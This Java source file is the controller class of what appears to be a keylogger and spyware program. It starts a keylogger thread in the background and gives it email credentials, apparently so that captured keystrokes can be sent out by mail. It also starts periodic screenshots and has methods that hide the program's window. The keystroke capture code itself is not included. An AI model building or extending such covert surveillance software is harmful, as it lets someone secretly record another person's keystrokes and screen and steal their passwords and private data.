package controller;

import frame.Display;

public class Controller {


    private KeyLogger keyLogger;
    private Display display;
    private Screenshot photographer;

    public KeyLogger getKeyLogger() {
        return keyLogger;
    }

    public void setKeyLogger(KeyLogger keyLogger) {
        this.keyLogger = keyLogger;
    }

    public Display getDisplay() {
        return display;
    }

    public void setDisplay(Display display) {
        this.display = display;
    }

    public Controller(){

        System.out.println(this);
        keyLogger = new KeyLogger();
        keyLogger.setCon(this);
        Thread t = new Thread(keyLogger);
        t.start();

    }

    public Controller(String interval, String email, String password){

        System.out.println(this);
        keyLogger = new KeyLogger();
        keyLogger.setCon(this);
        keyLogger.setCredentials(email,password);
        photographer = new Screenshot(interval);
        System.out.println("using second initalizer");
        Thread t = new Thread(keyLogger);
        t.start();

    }

    public void hideDisplay(){
        display.setVisible(false);
    }

    public void showDisplay(){
        display.setVisible(true);
    }


}
